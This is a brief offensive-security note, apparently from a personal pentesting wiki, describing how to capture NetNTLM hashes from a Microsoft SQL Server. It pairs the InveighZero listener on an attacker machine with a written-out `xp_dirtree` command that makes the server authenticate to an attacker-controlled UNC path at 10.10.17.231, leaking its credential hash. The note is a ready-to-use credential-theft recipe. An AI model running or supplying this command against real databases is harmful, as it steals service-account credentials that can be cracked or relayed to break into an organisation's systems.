## [[SQL NetNTLM Capture]]
We can use [[InveighZero]] to listen to the incoming requests (this should be run as a local admin).
1. [[InveighZero#Capture NetNTLM hash]]
2. Run `xp_dirtree` to connect the sql server to your machine running [[InveighZero]]
>EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
3. Receive hash on the attacking machine
